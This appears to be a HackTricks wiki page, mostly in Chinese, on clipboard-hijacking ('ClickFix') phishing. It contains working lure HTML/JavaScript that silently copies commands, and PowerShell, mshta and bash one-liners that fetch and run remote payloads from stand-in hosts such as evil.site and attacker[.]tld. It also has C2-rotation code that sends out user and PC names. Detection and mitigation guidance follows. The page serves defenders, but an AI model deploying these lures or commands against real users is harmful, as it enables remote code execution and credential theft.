# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "永远不要粘贴任何不是你自己复制的内容。" – 古老但仍然有效的建议

## Overview

Clipboard hijacking – also known as *pastejacking* – 利用用户习惯性地复制并粘贴命令而不进行检查的事实。恶意网页（或任何支持 JavaScript 的环境，例如 Electron 或 Desktop 应用）可以以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常会在精心设计的社交工程指示下被鼓励按下 **Win + R**（运行对话框）、**Win + X**（快速访问 / PowerShell），或打开终端并 *粘贴* 剪贴板内容，从而立即执行任意命令。

因为 **没有文件被下载，也没有附件被打开**，该技术能够绕过大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此该攻击在传播如 NetSupport RAT、Latrodectus loader 或 Lumma Stealer 等常见恶意软件家族的钓鱼活动中非常常见。

## JavaScript 概念验证 (Proof-of-Concept)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake 流程

1. 用户访问拼写仿冒或被入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` helper，将一个 Base64 编码的 PowerShell 单行命令静默写入剪贴板。
3. HTML 指示告诉受害者：*“按 **Win + R**，粘贴命令并按 Enter 以解决问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的归档（经典 DLL sideloading）。
5. 加载器解密后续阶段，注入 shellcode 并安装 persistence（例如 scheduled task）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### 示例 NetSupport RAT 链
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（合法的 Java WebStart）在其目录中搜索 `msvcp140.dll`。
* 恶意的 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），使用滚动 XOR 密钥 `"https://google.com/"` 对它们解密，注入最终的 shellcode 并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 在已签名的应用程序旁放置 `libcef.dll` → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer 通过 MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix 活动完全跳过文件下载，指示受害者粘贴一行命令，该命令通过 WSH 获取并执行 JavaScript，使其持久化，并每天轮换 C2。观测到的示例链：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 混淆的 URL 在运行时被反转以对抗随意检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 持久化自身，并根据当前日期选择 C2 —— 实现快速域名轮换。

用于按日期轮换 C2s 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常部署一个 loader 来建立持久性并拉取 RAT（例如 PureHVNC），通常将 TLS 固定到硬编码证书并对流量进行分块。

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.

蓝队可以结合剪贴板、进程创建和注册表遥测来定位 pastejacking 滥用：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保存 **Win + R** 命令历史 – 查找异常的 Base64 / 混淆条目。
* Security Event ID **4688** (Process Creation)，其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 之列。
* Event ID **4663**：在可疑 4688 事件之前，关注 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建。
* 如果存在 EDR 剪贴板传感器 — 关联 `Clipboard Write` 事件紧接着出现新的 PowerShell 进程。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

近期活动大量生成虚假的 CDN/浏览器验证页面（“Just a moment…”，IUAM-style），诱导用户将针对操作系统的命令从剪贴板粘贴到本地控制台。这会把执行从浏览器沙箱移出，并在 Windows 与 macOS 间通用。

生成器页面的关键特征
- 通过 `navigator.userAgent` 做 OS 检测以定制 payload（Windows 的 PowerShell/CMD vs. macOS 的 Terminal）。对不支持的 OS 可选择性显示诱饵/无操作以维持幻觉。
- 在无害 UI 操作（checkbox/Copy）时自动复制到剪贴板，而可见文本可能与剪贴板内容不同。
- 屏蔽移动端并显示一步步的弹出说明：Windows → Win+R→paste→Enter；macOS → open Terminal→paste→Enter。
- 可选的混淆和单文件注入器，用来用 Tailwind 风格的 verification UI 覆写被攻陷站点的 DOM（无需注册新域名）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` 以便在终端关闭后继续执行，减少可见的痕迹。

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web：绑定 Clipboard API 到 verification widgets 的页面；显示文本与剪贴板载荷不匹配；`navigator.userAgent` 分支逻辑；Tailwind + 在可疑场景下的单页替换。
- Windows endpoint：在浏览器交互后不久出现 `explorer.exe` → `powershell.exe`/`cmd.exe`；从 `%TEMP%` 执行的批处理/MSI 安装程序。
- macOS endpoint：Terminal/iTerm 在接近浏览器事件时生成 `bash`/`curl`/`base64 -d` 并使用 `nohup`；后台作业在终端关闭后仍存活。
- 关联 `RunMRU` Win+R 历史和剪贴板写入与随后创建的控制台进程。

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. 浏览器加固 – 禁用剪贴板写入访问（`dom.events.asyncClipboard.clipboardItem` 等）或要求用户手势。
2. 安全意识 – 教育用户*手动输入*敏感命令，或先将其粘贴到文本编辑器中。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control，用于阻止任意单行命令。
4. 网络控制 – 阻止对已知 pastejacking 和 malware C2 域的出站请求。

## Related Tricks

* **Discord Invite Hijacking** 通常在将用户诱导入恶意服务器后滥用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
